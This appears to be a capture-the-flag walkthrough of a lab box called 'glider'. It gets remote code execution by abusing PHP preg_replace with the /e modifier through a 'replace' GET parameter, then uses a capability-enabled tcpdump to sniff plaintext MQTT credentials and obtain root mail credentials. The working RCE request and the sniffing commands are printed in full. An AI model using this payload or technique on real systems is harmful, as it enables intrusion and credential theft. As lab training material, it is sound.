### path
XXE -> base64 -> index.php -> bypass regex to get the rce -> Inspecting the traffic of MQTT brokers to get root

### from w.html
```php
<?php

function ($str){
    $replacement = '';
    $bad_char = array('/\$/','/#/','/!/','/@/','/_/','/%/','/\^/','/&/','/\*/','/\(/','/\)/','/-/','/\+/','/=/','/{/','/}/','/|/');
    if (isset($_GET['replace'])){
        $bad_chars = ($_GET['replace']);
        foreach ($bad_chars as $bad_char => $replacement){
            $str = preg_replace($bad_char, $replacement, $str);
        }
    }
    else{
    $str = preg_replace($bad_char, $replacement, $str);
    }

    return $str;
}

$name = clean($_GET['name']);

?>
```

Researching the preg_replace() function online, we see that it returns a string or array of strings where all matches of a pattern or list of patterns found in the input are replaced with substrings.

Analyzing the source code, we note the following:
```
    The function clean takes name parameter and removes all the special characters.
    However if $_GET['replace'] is set (If there is a replace parameter in the GET request), it takes that as the pattern to search for, instead of the special characters.
    The vulnerability exists when the user can control the pattern to search for the replacement.
    In this case, if we add an extra parameter replace in the GET request, we can control replace to exploit the vulnerability.
    We need to insert the pattern to search for inside 2 / in [] like this replace[/t/]=a
    So if we request replace[/t/]=a it replaces all t with a.
    If we insert e after the delimiter (replace[/t/e]=a), it executes what comes in the place of a if t needs to be replaced.
```

```
POST /index.php?replace[/n/e]=system('id');&name=n%20w&email=test%40test.com&submit=Submit HTTP/1.1
```

### root
```bash
www-data@glider:/$ getcap -r / 2>/dev/null

/snap/core20/1434/usr/bin/ping cap_net_raw=ep
/snap/core20/1405/usr/bin/ping cap_net_raw=ep
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper cap_net_bind_service,cap_net_admin=ep
/usr/bin/tcpdump cap_net_admin,cap_net_raw=eip
/usr/bin/mtr-packet cap_net_raw=ep
/usr/bin/ping cap_net_raw=ep

From the output, tcpdump stands out with the privilege to sniff the network without root privileges.

As MQTT sends a password without encryption, we can sniff on localhost.

Running ifconfig, we can see the network interfaces of the target machine.

www-data@glider:/$ ifconfig
enp0s3: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.43.33  netmask 255.255.255.0  broadcast 192.168.43.255
        ether 08:00:27:5e:49:71  txqueuelen 1000  (Ethernet)
        RX packets 423791  bytes 53495914 (53.4 MB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 410618  bytes 28911095 (28.9 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 343  bytes 28052 (28.0 KB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 343  bytes 28052 (28.0 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

We see that interface lo is localhost.

In order to sniff with tcpdump we need to specify the interface with -i.

    To print the packets we need to specify -A.

       -A     Print each packet (minus its link level header) in ASCII.  Handy for capturing web pages.

Now we can run the following command to sniff the network.

www-data@glider:/$ tcpdump -i lo -A

tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on lo, link-type EN10MB (Ethernet), snapshot length 262144 bytes

After waiting for about 10 seconds many packets are printed out.

www-data@glider:/var/www/html$ tcpdump -i lo -A
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode                                                                                             listening on lo, link-type EN10MB (Ethernet), snapshot length 262144 bytes
13:56:13.228299 IP localhost.35294 > localhost.1883: Flags [S], seq 1035075819, win 65495, options [mss 65495,sackOK,TS val 665785784 ecr 0,nop,wscale 7], length 0   E..<..@.@.;............[=............0.........                                                                                                                       '...........                                                                                                                                                          13:56:13.228361 IP localhost.1883 > localhost.35294: Flags [S.], seq 3535571478, ack 1035075820, win 65483, options [mss 65495,sackOK,TS val 665785784 ecr 665785784,nop,wscale 7], length 0
E..<..@.@.<..........[......=........0.........                                                                                                                       '...'.......
13:56:13.228421 IP localhost.35294 > localhost.1883: Flags [.], ack 1, win 512, options [nop,nop,TS val 665785784 ecr 665785784], length 0                            E..4..@.@.;............[=............(.....                                                                                                                           '...'...
13:56:13.229216 IP localhost.35294 > localhost.1883: Flags [P.], seq 1:43, ack 1, win 512, options [nop,nop,TS val 665785785 ecr 665785784], length 42                E..^..@.@.:............[=............R.....                                                                                                                           '...'....(..MQTT...<....steven..wannabeinacatfight92
......

Looking through the ouput, we can see the password wannabeinacatfight92 for steven .

The topic seems to be 'important' and we can use it with the -t flag.

┌──(kali㉿kali)-[~]
└─$ mosquitto_sub -h  172.16.201.50 -u steven  -P wannabeinacatfight92 -t important


MAIL Creds:
 Username: root@glider.local
 Password: Imflyingsohigh8937
```
